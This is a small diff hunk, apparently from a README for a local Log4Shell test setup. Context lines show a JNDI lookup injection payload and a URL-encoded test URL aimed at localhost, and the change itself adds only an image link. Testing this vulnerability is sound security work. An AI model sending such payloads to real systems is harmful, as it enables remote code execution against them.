@@ -9,4 +9,5 @@ input parameter value : ${jndi:ldap://127.0.0.1:3089/} ...encode it before passi
 URL to test : http://localhost:7002/resources/1?query=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A3089%2F%7D
 
 
+![MicrosoftTeams-image (4)](https://user-images.githubusercontent.com/16112135/146688713-e49aa8b0-488f-414b-b64a-5becaf3fa299.png)
 
